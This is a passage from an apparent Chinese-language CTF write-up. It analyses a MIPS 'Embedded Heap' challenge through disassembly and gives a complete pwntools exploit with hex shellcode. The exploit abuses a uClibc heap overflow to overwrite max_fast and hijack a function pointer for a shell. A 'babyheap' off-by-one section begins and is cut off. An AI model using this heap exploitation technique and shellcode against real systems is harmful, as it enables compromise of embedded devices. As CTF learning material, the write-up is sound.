class="line">.text:00001BA4</span><br><span class="line">.text:00001BA4 loc_1BA4:                                # CODE XREF: main+D4↑j</span><br><span class="line">.text:00001BA4                                          # main+F8↑j</span><br><span class="line">.text:00001BA4                 b       loc_1A30         # Branch Always</span><br><span class="line">.text:00001BA8                 nop</span><br><span class="line">.text:00001BAC  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001BAC</span><br><span class="line">.text:00001BAC loc_1BAC:                                # CODE XREF: main+190↑j</span><br><span class="line">.text:00001BAC                                          # main+19C↑j ...</span><br><span class="line">.text:00001BAC                 move    $sp, $fp</span><br><span class="line">.text:00001BB0                 lw      $ra, 0x28+var_4($sp)  # Load Word</span><br><span class="line">.text:00001BB4                 lw      $fp, 0x28+var_8($sp)  # Load Word</span><br><span class="line">.text:00001BB8                 addiu   $sp, 0x28        # Add Immediate Unsigned</span><br><span class="line">.text:00001BBC                 jr      $ra              # Jump Register</span><br><span class="line">.text:00001BC0                 nop</span><br><span class="line">.text:00001BC0  # End of function main</span><br></pre></td></tr></table></figure>
<p>首先setbuf中map一段随机地址保存后面的chunk信息<br>而后利用随机数随机分配一些随机大小的chunk<br>可以进行update,free,view和exit操作<br>free操作只有两次，且可以看到没有UAF:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00001838                 move    $a0, $v0         # ptr</span><br><span class="line">.text:0000183C                 la      $v0, free        # Load Address</span><br><span class="line">.text:00001840                 move    $t9, $v0</span><br><span class="line">.text:00001844                 jalr    $t9 ; free       # Jump And Link Register</span><br><span class="line">.text:00001848                 nop</span><br><span class="line">.text:0000184C                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001850                 lw      $v0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:00001854                 sll     $v0, 2           # Shift Left Logical</span><br><span class="line">.text:00001858                 sll     $v1, $v0, 2      # Shift Left Logical</span><br><span class="line">.text:0000185C                 subu    $v0, $v1, $v0    # Subtract Unsigned</span><br><span class="line">.text:00001860                 lw      $v1, 0x28+arg_0($fp)  # Load Word</span><br><span class="line">.text:00001864                 addu    $v0, $v1, $v0    # Add Unsigned</span><br><span class="line">.text:00001868                 sw      $zero, 8($v0)</span><br></pre></td></tr></table></figure>
<p>不过在update过程中:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">.text:0000157C update:                                  # CODE XREF: main+C8↓p</span><br><span class="line">.text:0000157C                                          # main+180↓p</span><br><span class="line">.text:0000157C                                          # DATA XREF: ...</span><br><span class="line">.text:0000157C</span><br><span class="line">.text:0000157C var_18          &#x3D; -0x18</span><br><span class="line">.text:0000157C var_10          &#x3D; -0x10</span><br><span class="line">.text:0000157C var_C           &#x3D; -0xC</span><br><span class="line">.text:0000157C var_8           &#x3D; -8</span><br><span class="line">.text:0000157C var_4           &#x3D; -4</span><br><span class="line">.text:0000157C arg_0           &#x3D;  0</span><br><span class="line">.text:0000157C</span><br><span class="line">.text:0000157C                 li      $gp, 0x18A84     # Load Immediate</span><br><span class="line">.text:00001584                 addu    $gp, $t9         # Add Unsigned</span><br><span class="line">.text:00001588                 addiu   $sp, -0x28       # Add Immediate Unsigned</span><br><span class="line">.text:0000158C                 sw      $ra, 0x28+var_4($sp)  # Store Word</span><br><span class="line">.text:00001590                 sw      $fp, 0x28+var_8($sp)  # Store Word</span><br><span class="line">.text:00001594                 move    $fp, $sp</span><br><span class="line">.text:00001598                 sw      $gp, 0x28+var_18($sp)  # Store Word</span><br><span class="line">.text:0000159C                 sw      $a0, 0x28+arg_0($fp)  # Store Word</span><br><span class="line">.text:000015A0                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:000015A4                 addiu   $a0, $v0, aIndex  # &quot;Index: &quot;</span><br><span class="line">.text:000015A8                 la      $v0, printf      # Load Address</span><br><span class="line">.text:000015AC                 move    $t9, $v0</span><br><span class="line">.text:000015B0                 jalr    $t9 ; printf     # Jump And Link Register</span><br><span class="line">.text:000015B4                 nop</span><br><span class="line">.text:000015B8                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:000015BC                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:000015C0                 addiu   $v0, get_num     # Add Immediate Unsigned</span><br><span class="line">.text:000015C4                 move    $t9, $v0</span><br><span class="line">.text:000015C8                 jalr    $t9 ; get_num    # Jump And Link Register</span><br><span class="line">.text:000015CC                 nop</span><br><span class="line">.text:000015D0                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:000015D4                 sw      $v0, 0x28+var_10($fp)  # Store Word</span><br><span class="line">.text:000015D8                 lw      $v0, 0x28+var_10($fp)  # Load Word</span><br><span class="line">.text:000015DC                 bltz    $v0, loc_161C    # Branch on Less Than Zero</span><br><span class="line">.text:000015E0                 nop</span><br><span class="line">.text:000015E4                 lw      $v0, 0x28+var_10($fp)  # Load Word</span><br><span class="line">.text:000015E8                 slti    $v0, 0x10        # Set on Less Than Immediate</span><br><span class="line">.text:000015EC                 beqz    $v0, loc_161C    # Branch on Zero</span><br><span class="line">.text:000015F0                 nop</span><br><span class="line">.text:000015F4                 lw      $v0, 0x28+var_10($fp)  # Load Word</span><br><span class="line">.text:000015F8                 sll     $v0, 2           # Shift Left Logical</span><br><span class="line">.text:000015FC                 sll     $v1, $v0, 2      # Shift Left Logical</span><br><span class="line">.text:00001600                 subu    $v0, $v1, $v0    # Subtract Unsigned</span><br><span class="line">.text:00001604                 lw      $v1, 0x28+arg_0($fp)  # Load Word</span><br><span class="line">.text:00001608                 addu    $v0, $v1, $v0    # Add Unsigned</span><br><span class="line">.text:0000160C                 lw      $v1, 0($v0)      # Load Word</span><br><span class="line">.text:00001610                 li      $v0, 1           # Load Immediate</span><br><span class="line">.text:00001614                 beq     $v1, $v0, loc_1640  # Branch on Equal</span><br><span class="line">.text:00001618                 nop</span><br><span class="line">.text:0000161C</span><br><span class="line">.text:0000161C loc_161C:                                # CODE XREF: update+60↑j</span><br><span class="line">.text:0000161C                                          # update+70↑j</span><br><span class="line">.text:0000161C                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001620                 addiu   $a0, $v0, aInvalidIndex  # &quot;Invalid Index&quot;</span><br><span class="line">.text:00001624                 la      $v0, puts        # Load Address</span><br><span class="line">.text:00001628                 move    $t9, $v0</span><br><span class="line">.text:0000162C                 jalr    $t9 ; puts       # Jump And Link Register</span><br><span class="line">.text:00001630                 nop</span><br><span class="line">.text:00001634                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001638                 b       loc_1708         # Branch Always</span><br><span class="line">.text:0000163C                 nop</span><br><span class="line">.text:00001640  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001640</span><br><span class="line">.text:00001640 loc_1640:                                # CODE XREF: update+98↑j</span><br><span class="line">.text:00001640                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001644                 addiu   $a0, $v0, aSize  # &quot;Size: &quot;</span><br><span class="line">.text:00001648                 la      $v0, printf      # Load Address</span><br><span class="line">.text:0000164C                 move    $t9, $v0</span><br><span class="line">.text:00001650                 jalr    $t9 ; printf     # Jump And Link Register</span><br><span class="line">.text:00001654                 nop</span><br><span class="line">.text:00001658                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:0000165C                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001660                 addiu   $v0, get_num     # Add Immediate Unsigned</span><br><span class="line">.text:00001664                 move    $t9, $v0</span><br><span class="line">.text:00001668                 jalr    $t9 ; get_num    # Jump And Link Register</span><br><span class="line">.text:0000166C                 nop</span><br><span class="line">.text:00001670                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001674                 sw      $v0, 0x28+var_C($fp)  # Store Word</span><br><span class="line">.text:00001678                 lw      $v0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:0000167C                 bgtz    $v0, loc_168C    # Branch on Greater Than Zero</span><br><span class="line">.text:00001680                 nop</span><br><span class="line">.text:00001684                 b       loc_1708         # Branch Always</span><br><span class="line">.text:00001688                 nop</span><br><span class="line">.text:0000168C  # ---------------------------------------------------------------------------</span><br><span class="line">.text:0000168C</span><br><span class="line">.text:0000168C loc_168C:                                # CODE XREF: update+100↑j</span><br><span class="line">.text:0000168C                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001690                 addiu   $a0, $v0, aContent  # &quot;Content: &quot;</span><br><span class="line">.text:00001694                 la      $v0, printf      # Load Address</span><br><span class="line">.text:00001698                 move    $t9, $v0</span><br><span class="line">.text:0000169C                 jalr    $t9 ; printf     # Jump And Link Register</span><br><span class="line">.text:000016A0                 nop</span><br><span class="line">.text:000016A4                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:000016A8                 lw      $v0, 0x28+var_10($fp)  # Load Word</span><br><span class="line">.text:000016AC                 sll     $v0, 2           # Shift Left Logical</span><br><span class="line">.text:000016B0                 sll     $v1, $v0, 2      # Shift Left Logical</span><br><span class="line">.text:000016B4                 subu    $v0, $v1, $v0    # Subtract Unsigned</span><br><span class="line">.text:000016B8                 lw      $v1, 0x28+arg_0($fp)  # Load Word</span><br><span class="line">.text:000016BC                 addu    $v0, $v1, $v0    # Add Unsigned</span><br><span class="line">.text:000016C0                 lw      $v1, 8($v0)      # Load Word</span><br><span class="line">.text:000016C4                 lw      $v0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:000016C8                 move    $a0, $v1</span><br><span class="line">.text:000016CC                 move    $a1, $v0</span><br><span class="line">.text:000016D0                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:000016D4                 addiu   $v0, sub_AD0     # Add Immediate Unsigned</span><br><span class="line">.text:000016D8                 move    $t9, $v0</span><br><span class="line">.text:000016DC                 jalr    $t9 ; sub_AD0    # Jump And Link Register</span><br><span class="line">.text:000016E0                 nop</span><br><span class="line">.text:000016E4                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:000016E8                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:000016EC                 addiu   $a0, $v0, aChunkDUpdated  # &quot;Chunk %d Updated\n&quot;</span><br><span class="line">.text:000016F0                 lw      $a1, 0x28+var_10($fp)  # Load Word</span><br><span class="line">.text:000016F4                 la      $v0, printf      # Load Address</span><br><span class="line">.text:000016F8                 move    $t9, $v0</span><br><span class="line">.text:000016FC                 jalr    $t9 ; printf     # Jump And Link Register</span><br><span class="line">.text:00001700                 nop</span><br><span class="line">.text:00001704                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001708</span><br><span class="line">.text:00001708 loc_1708:                                # CODE XREF: update+BC↑j</span><br><span class="line">.text:00001708                                          # update+108↑j</span><br><span class="line">.text:00001708                 move    $sp, $fp</span><br><span class="line">.text:0000170C                 lw      $ra, 0x28+var_4($sp)  # Load Word</span><br><span class="line">.text:00001710                 lw      $fp, 0x28+var_8($sp)  # Load Word</span><br><span class="line">.text:00001714                 addiu   $sp, 0x28        # Add Immediate Unsigned</span><br><span class="line">.text:00001718                 jr      $ra              # Jump Register</span><br><span class="line">.text:0000171C                 nop</span><br><span class="line">.text:0000171C  # End of function update</span><br></pre></td></tr></table></figure>

<p>可以看到最终read的size可控，所以可以溢出控制整个堆</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>mips下主要使用的是针对嵌入式环境的uclibc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.uclibc.org&#x2F;downloads&#x2F;</span><br></pre></td></tr></table></figure>
<p>其针对堆的实现有:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">malloc-standard</span><br><span class="line">malloc-simple</span><br></pre></td></tr></table></figure>
<p>其中malloc是最开始uclibc内部实现的堆实现方式，后期使用的是malloc-standard,即从glibc中迁移过来的堆管理方式，几种方式源码实现方式都比较简单,不用细说<br>uClibc-0.9.33.2下使用的是malloc-standard<br>free过程中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(<span class="built_in">size</span>) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS<span class="comment">//此处定义后，topchunk前的fastbin大小的chunk不会free进入fastbin</span></span><br><span class="line">	    <span class="comment">/* If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">	       bordering top into fastbins */</span></span><br><span class="line">	    &amp;&amp; (chunk_at_offset(p, <span class="built_in">size</span>) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">       ) &#123;</span><br><span class="line"></span><br><span class="line">	set_fastchunks(av);<span class="comment">//设置max_fast中对应标志位</span></span><br><span class="line">	fb = &amp;(av-&gt;fastbins[fastbin_index(<span class="built_in">size</span>)]);<span class="comment">//av中对应bin的位置</span></span><br><span class="line">	p-&gt;fd = *fb;</span><br><span class="line">	*fb = p;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)        ((((unsigned int)(sz)) &gt;&gt; 3) - 2)</span></span><br></pre></td></tr></table></figure>
<p>所以这里可以首先修改size来覆写max_fast<br>此时将一个ptr写入max_fast,这样再次free一个大堆时就可以将一个堆块指针写入一个高地址处的func_ptr来劫持控制流，因为可以看到NX下heap具有可执行权限，将其填充好shellcode即可<br>在exit过程中跟踪程序流可以看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   0x77fe8f18 &lt;_ftext+104&gt;    ori    $v0, $v0, 8</span><br><span class="line"> ► 0x77fe8f1c &lt;_ftext+108&gt;    lw     $t9, -0x7fac($gp) &lt;0x77fe8eb0&gt;</span><br><span class="line">   0x77fe8f20 &lt;_ftext+112&gt;    move   $a0, $s0</span><br><span class="line">   0x77fe8f24 &lt;_ftext+116&gt;    jalr   $t9</span><br><span class="line"> </span><br><span class="line">   0x77fe8f28 &lt;_ftext+120&gt;    sh     $v0, 0x4a($s0)</span><br><span class="line">   0x77fe8f2c &lt;_ftext+124&gt;    lw     $v0, 0x9c($s0)</span><br><span class="line">   0x77fe8f30 &lt;_ftext+128&gt;    beqz   $v0, _ftext+156 &lt;0x77fe8f4c&gt;</span><br><span class="line"> </span><br><span class="line">   0x77fe8f34 &lt;_ftext+132&gt;    lw     $gp, 0x10($fp)</span><br><span class="line">   0x77fe8f38 &lt;_ftext+136&gt;    lw     $t9, ($s0)</span><br><span class="line">   0x77fe8f3c &lt;_ftext+140&gt;    addu   $t9, $v0, $t9</span><br><span class="line">   0x77fe8f40 &lt;_ftext+144&gt;    jalr   $t9</span><br><span class="line">pwndbg&gt; print $gp</span><br><span class="line">$4 &#x3D; 2013294608</span><br><span class="line">#0x78007010</span><br></pre></td></tr></table></figure>
<p>此处函数地址位于<code>/lib/ld-uClibc-0.9.33.2.so</code>，位于state高地址，可以覆盖此处为一个chunk地址，而后在presize置跳转到真正shellcode(因为覆盖的地址指向chunk头，不是data域)，或者直接利用最后的update将对应位置写入shellcode<br>整个利用过程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The maximum chunk size to be eligible for fastbin */</span></span><br><span class="line">  <span class="keyword">size_t</span>  max_fast;   <span class="comment">/* low 2 bits used as flags */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins. Trailing zero map handles cases of largest binned size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     binmap[BINMAPSIZE+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>     trim_threshold;</span><br><span class="line">  <span class="keyword">size_t</span>  top_pad;</span><br><span class="line">  <span class="keyword">size_t</span>  mmap_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="keyword">int</span>              n_mmaps;</span><br><span class="line">  <span class="keyword">int</span>              n_mmaps_max;</span><br><span class="line">  <span class="keyword">int</span>              max_n_mmaps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Cache malloc_getpagesize */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     pagesize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Track properties of MORECORE */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     morecore_properties;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  <span class="keyword">size_t</span>  mmapped_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  sbrked_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  max_sbrked_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  max_mmapped_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  max_total_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>先置一个chunk的size为8，此时free掉即可覆盖max_fast<br>再根据需要覆盖的函数指针地址和state的偏移设置另一个chunk(布置shellcode)，free后，即可将此处函数指针置为&amp;shellcode,最终调用即可get shell</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req2size</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span>  (<span class="number">0x10</span> <span class="keyword">if</span> size+<span class="number">4</span>+<span class="number">7</span>&lt;<span class="number">0x10</span> <span class="keyword">else</span> (size+<span class="number">4</span>+<span class="number">7</span>)&amp;(~<span class="number">7</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index,size,data,first=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> first:</span><br><span class="line">        p.sendlineafter(<span class="string">": "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">": "</span>,data)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">9332</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.arch=<span class="string">"mips"</span></span><br><span class="line">p.recvuntil(<span class="string">"===== Embedded Heap =====\n"</span>)</span><br><span class="line">size_map=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Chunk"</span> <span class="keyword">not</span> <span class="keyword">in</span> p.recvuntil(<span class="string">":"</span>):</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    size=p.recvuntil(<span class="string">" bytes"</span>)[<span class="number">1</span>:<span class="number">-6</span>]</span><br><span class="line">    size_map.append(req2size(int(size)))</span><br><span class="line"><span class="keyword">print</span> map(hex,size_map)</span><br><span class="line">state_off = <span class="number">0x66D7C</span></span><br><span class="line">fini_off = <span class="number">0x7f064</span></span><br><span class="line">fake_size =((((fini_off-state_off)&amp;<span class="number">0xffffffff</span>)/<span class="number">4</span> + <span class="number">1</span>)*<span class="number">8</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(fake_size)</span><br><span class="line">shellcode = <span class="string">"3c092f2f35296269afa9fff43c096e2f35297368afa9fff8afa0fffc27bdfff403a02020afa0fffc27bdfffc2806ffffafa6fffc23bdfffc03a030203c198c973739ffff03204827afa9fffc27bdfffc2805ffffafa5fffc23bdfffc2419fffb0320282700bd2820afa5fffc23bdfffc03a0282034020fab0101010c"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.mips.linux.sh(),endian="big")//something wrong</span></span><br><span class="line">data_size=&#123; size_map[<span class="number">0</span>]<span class="number">-8</span> : p32(<span class="number">0</span>) + p32(<span class="number">8</span>,endian = <span class="string">'big'</span>),</span><br><span class="line">	size_map[<span class="number">1</span>]+size_map[<span class="number">0</span>]<span class="number">-8</span> : p32(<span class="number">0</span>)+p32(fake_size,endian = <span class="string">'big'</span>) &#125;</span><br><span class="line">data = fit(data_size,filler=<span class="string">"\x00"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">update(<span class="number">0</span>,len(data),data,<span class="literal">True</span>)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,<span class="string">"2"</span>)</span><br><span class="line">code = &#123;size_map[<span class="number">1</span>]+size_map[<span class="number">0</span>]<span class="number">-8</span> : shellcode&#125;</span><br><span class="line">fake_code = fit(code,filler=<span class="string">"\x00"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(len(fake_code)))</span><br><span class="line"><span class="comment">#time.sleep(20)//For gdbserver  to debug</span></span><br><span class="line">p.sendafter(<span class="string">": "</span>,fake_code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x02-babyheap"><a href="#0x02-babyheap" class="headerlink" title="0x02 babyheap"></a>0x02 babyheap</h2><p>比较简单的off-by-one<br>选择利用unlink构造堆重叠而后进一步利用<br><strong>注意libc-2.29下unsorted合并有前后size对照检查以及使用ld文件进行本地调试即可</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 